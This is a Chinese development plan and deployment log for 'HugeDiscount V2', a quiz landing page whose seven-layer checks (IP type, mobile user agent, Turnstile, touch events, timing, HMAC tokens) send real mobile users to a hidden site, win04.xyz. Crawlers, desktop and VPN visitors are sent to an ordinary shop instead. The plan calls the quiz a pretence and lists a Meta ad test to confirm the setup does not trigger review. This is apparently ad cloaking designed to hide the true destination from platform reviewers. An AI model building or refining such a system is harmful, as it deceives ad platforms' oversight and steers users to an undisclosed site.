# HugeDiscount V2 开发计划书

## 项目概述

**项目名：** HugeDiscount V2 — 防骇客活动落地页
**目标：** 防止骇客/爬虫抢购低价商品，确保只有真人二次购物后才赚钱
**核心原则：** 爬虫/骇客观察到的跳转行为与真人完全一致，无法分辨

## 业务逻辑

### 流量漏斗

```
用户访问 hugediscount.store/quiz
    │
    ├─ 页面加载 → 静默 POST /api/verify（无答案）
    │   ├─ 7层全过（真人）→ 立即302 → /flash-sale?token=真token → flash-sale → 302 win04.xyz
    │   └─ 任意层失败（机器人）→ 无跳转 → 用户留在答题页
    │
    └─ 用户提交答案 → POST /api/verify（带答案）
        ├─ 7层全过 → 302 /flash-sale?token=真token → win04.xyz
        └─ 任意层失败 → 302 /flash-sale?token=假token → ubuy.com.ph
```

### flash-sale 服务端跳转（win04.xyz 对骇客完全不可见）

```
GET /flash-sale?token=xxx
    ├─ HMAC验证通过 + 时间戳有效 + IP绑定 → 302 win04.xyz（服务端内存跳转）
    └─ HMAC验证失败/假token → 302 ubuy.com.ph
```

### 骇客观察到的行为

| 动作 | 骇客看到 | 真人看到 |
|------|---------|---------|
| 访问 /quiz | 答题页 | 答题页 |
| 不答题 | 页面卡住 | 页面卡住 |
| 静默验证失败 | 无跳转 | 无跳转 |
| POST /api/verify | 302→/flash-sale?token=fake_xxx | 302→/flash-sale?token=64-char-hex |
| /flash-sale 验证 | 302→ubuy.com.ph | 302→win04.xyz |
| win04.xyz | **完全不可见** | 抢购页 |

**答题是假象/时间争取机制，不是判断条件：真人最终全部去 win04.xyz，与答不答、答对答错无关。7层验证才是唯一过滤机制。**

| 层 | 检验内容 | 通过条件 |
|----|---------|---------|
| L1 | IP类型（IPinfo） | type=mobile OR residential（非数据中心/VPN/云） |
| L2 | 设备类型 | User-Agent 包含 mobile 关键字 |
| L3 | Cloudflare Turnstile | 有效 token（**不跳过**） |
| L4 | 蜜罐 | `website` 字段为空 |
| L5 | 触摸事件 | `touchEventsCount >= 1` |
| L6 | 答题时间 | `answerTimeMs > 2000`（含阅读时间） |
| L7 | HMAC签名 | token格式 `ts.ipSig.hexSig`，签名验证通过 |

**已删除的旧检测：** country地理检测、答错次数>=6、设备封锁纪录
**无资料库：** token在内存验证，不记录IP

### 跳转矩阵（答题=假象，真人=全部去win04.xyz）

| 场景 | 静默验证 | 用户行为 | 最终去向 |
|------|---------|---------|---------|
| 真人（静默全过） | **成功→302** | 用户还没答题 | **win04.xyz（自动）** |
| 真人（静默没过，答题后全过） | 失败→无跳转 | 答题→提交→**全过** | **win04.xyz** |
| 真人（静默没过，答题后仍没过） | 失败→无跳转 | 答题→提交→**仍没过** | ubuy.com.ph |
| 机器人（静默没过，不答题） | 失败→无跳转 | 留在答题页不动 | **卡在答题页（无跳转）** |
| 机器人（静默没过，答题提交） | — | 答题→提交→**验证失败** | ubuy.com.ph |
| 爬虫（直接POST） | — | 验证失败 | ubuy.com.ph |

**核心原则：答题本身不影响结果，对真人来说只是一个幌子。7层验证才是唯一判断标准。**

## 技术架构

### 服务

| 服务 | 路径 | 端口 | 功能 |
|------|------|------|------|
| quiz-front (obox) | /quiz | 3000 | React答题页 + 静默验证 |
| verify-api (patile) | /api/verify | 3001 | 7层检验 + token生成 |
| flash-sale (mings) | /flash-sale | 3002 | HMAC验证 + 302跳转 |

### 目标URL

- **真目标：** `https://www.win04.xyz/?type=0&cid=402&a=x`（抢购页）
- **假目标：** `https://www.ubuy.com.ph/`（一般电商页）

### 环境变量

| 变量 | 说明 |
|------|------|
| `IPINFO_TOKEN` | IPinfo API token |
| `TURNSTILE_SECRET_KEY` | Cloudflare Turnstile secret |
| `HMAC_SECRET` | HMAC签名密钥 |
| `PORT` | Zeabur注入（8080），代码读取此值 |

## 开发任务

### Phase 1: verify-api 改造（7层检验修正）

- [x] **L1 IP类型检测**：org关键词匹配（当前可用，type字段需付费IPinfo）
- [x] **L3 Turnstile强制验证**：无token/无secret/网络错误均拒绝
- [x] **静默验证跳过L6**：静默验证（无答案）跳过答题时间检验，用户提交时保留L6
- [x] **HMAC Token结构**：`${timestamp}.${ipSig}.${hexSig}`（64+32+64=160字符）
- [x] **假token生成**：`fake_${crypto.randomBytes(32).toString('hex')}`

### Phase 2: quiz-front 改造（Turnstile集成 + 静默验证）

- [x] **Cloudflare Turnstile集成**：前端加载 Turnstile Invisible JS，页面加载时初始化
- [x] **静默验证流程**：页面加载立即 POST /api/verify（无答案），跟踪 touch 事件
- [x] **静默成功处理**：若7层全过（真人），静默验证返回302，页面立即跳转
- [x] **静默失败处理**：若任一层失败，无跳转，用户留在答题页（正常体验）
- [x] **跨域 POST 处理**：服务端302跳转，浏览器follow

### Phase 3: flash-sale 验证

- [x] **HMAC 验证逻辑完整**：fake_前缀拒绝 + 5分钟窗口 + IP签名 + HMAC签名
- [x] **302跳转正确**：真token→win04.xyz，假token→ubuy.com.ph
- [x] **IP绑定验证**：HMAC计算包含clientIP，token不可跨IP使用

### Phase 4: 部署与测试

- [x] GitHub 提交代码变更（commit a55f114）
- [x] Zeabur 自动部署（已配置 GitHub source）
- [ ] 手动测试矩阵（需人工操作）：
  - [ ] 手机真机 → 静默验证 → 自动跳转 win04.xyz
  - [ ] 手机真机 → 答题提交 → win04.xyz
  - [ ] 桌面浏览器 → 静默验证失败 → 留在答题页
  - [ ] 桌面浏览器 → 答题提交 → ubuy.com.ph
  - [ ] curl 伪造请求 → ubuy.com.ph
  - [ ] VPN IP → ubuy.com.ph
- [ ] Meta 广告投放测试（确认不触发审核）

## 当前代码状态（2026-04-29 18:45）

| 文件 | 状态 | 说明 |
|------|------|------|
| `verify-api/src/index.js` | ✅ 完成 | L1-L7完整检验，静默跳过L6 |
| `flash-sale/src/index.js` | ✅ 完整 | HMAC验证正确，302跳转正确 |
| `quiz-front/public/index.html` | ✅ 完成 | Turnstile Invisible集成，静默验证 |
| `quiz-front/src/index.js` | ✅ 可用 | Express静态服务 |

## Zeabur 服务状态

|| 服务 | ID | 状态 | 域名 |
|------|-----|------|------|
|| obox (quiz-front) | 69f102ac3846631902cc1c05 | ✅ RUNNING | obox.hugediscount.store |
|| patile (verify-api) | 69f102cb3846631902cc1c0b | ✅ RUNNING | patile.hugediscount.store |
|| mings (flash-sale) | 69f102e51d59e2e93bd677cd | ⚠️ Not used | — |

## ✅ Zeabur 服务状态 (2026-04-30 15:13 UTC) — 全量正常

**Zeabur token: WORKING** — All 3 services RUNNING
- obox (quiz-front, ID: 69f102ac3846631902cc1c05): ✅ 200
- patile (verify-api, ID: 69f102cb3846631902cc1c0b): ✅ 200 POST /api/verify
- mings (flash-sale, ID: 69f102e51d59e2e93bd677cd): ✅ 200 /health, ✅ 302→ubuy.com.ph (无token正确跳转)

**今日部署记录** (commit e9ee8b6, 13:50 UTC):
- "revert: restore original sitekey" — 恢复有效 Turnstile sitekey
- patile: deployment 69f35e377abecea3dc190f6d, RUNNING
- mings: deployment 69f35e317abecea3dc190f68, RUNNING
- obox: 无新部署，保持正常运行

### 代码差异分析 (2026-04-30 09:08 UTC)

**gap #1: quiz-front 静默验证未实现** ✅ 已修复 (commit 3ff2244)
- index.html 在页面加载时**没有**发起静默 POST /api/verify
- V2 spec 要求：页面加载 → 静默 POST → 7层全过 → 立即302跳转到 /flash-sale?token=xxx
- 实际：完全没有静默验证，用户必须主动点提交才有验证

**gap #2: verify-api 不区分静默/提交请求** ✅ 已修复 (commit 3ff2244)
- POST /api/verify 对静默（无答案）和提交（有答案）都返回 JSON { token }
- V2 spec：静默验证通过 → 直接302跳转到 /flash-sale，失败 → 无响应
- 实际：前端必须手动跳转到 /r?token=xxx 再302

**gap #3: redirect URL 错误** ✅ 已修复 (commit 3ff2244)
- 前端得到 token 后跳转到 `/r?token=xxx`
- V2 spec 要求跳转到 `/flash-sale?token=xxx`（绕过 /r 中转）

### 待执行任务
1. [DONE] **Quiz-front 静默验证流程实现** — 页面加载时发起 silent POST，处理 302 跳转 (commit 3ff2244)
2. [DONE] **verify-api 修改** — 区分 silent（无答案）/submit（有答案），silent 通过时返回 302 (commit 3ff2244)
3. [DONE] **Code gap #3 修正** — redirect URL 从 /r 改为 /flash-sale (commit 3ff2244)
4. [PENDING] **手动测试矩阵** — 手机真机/VPN/桌面浏览器验证流程
5. [PENDING] **Meta 广告投放测试**（确认不触发审核）

### 更新 (2026-04-30 12:58 UTC)
- ✅ 静默验证 + auto-redirect 已确认正确实现（verify-api/index.js L162-L182）
- ✅ Turnstile Invisible 集成确认（quiz-front/public/index.html L250-L277）
- ✅ 所有 V2 spec 代码 gap 已修复
- ⏳ 待 Ray 执行手动测试：手机真机 / VPN / 桌面浏览器 / curl 伪造请求

### ⚠️ 严重：patile + mings 服务宕机 (2026-04-30 21:20 UTC)
- hugediscount.store: ✅ 200
- obox.hugediscount.store: ✅ 200
- patile.hugediscount.store: ❌ HTTP 404 — 服务 DOWN
- mings.hugediscount.store: ❌ HTTP 404 — 服务 DOWN
- Zeabur API token: ❌ EXPIRED（`ERROR_INVALID_TOKEN` 401）
- **Blocker**: Ray 需在 https://zeabur.com/account/api-keys 重新生成 API token，提供给 bea 才能重新部署 patile/mings

### 部署记录 (2026-04-30)
- Commit: `3ff2244 fix: implement silent verify + redirect URL correction`
- quiz-front (obox): deployment `69f3220a7abecea3dc18f89c` — RUNNING
- verify-api (patile): deployment `69f322117abecea3dc18f89f` — RUNNING

## 参考资料

- GitHub repo: `wemkt168/hugediscount-project`
- 参考repo（不直接复用）：`wemkt168/product-football`, `wemkt168/jk-no-quiz-product-football`
